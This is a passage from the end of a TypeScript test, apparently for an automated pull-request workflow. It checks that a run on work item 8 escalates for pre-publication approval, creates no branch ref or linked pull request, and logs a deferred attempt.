        [...fixture.refs.keys()].some(
          (ref) => ref.includes("work-item-8") && ref.startsWith("refs/heads/"),
        ),
      ).toBe(false);

      const recovered = await fixture.run();
      expect(recovered).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(/pre-publication approval.*only after a push/i),
      });
      expect(fixture.snapshot.workItems[0]!.linkedPullRequests).toEqual([]);
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptDeferred" && event.workItem === 8,
          ),
      ).toBe(true);
      expect(
        [...fixture.refs.keys()].some(
          (ref) => ref.includes("work-item-8") && ref.startsWith("refs/heads/"),
        ),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);
});
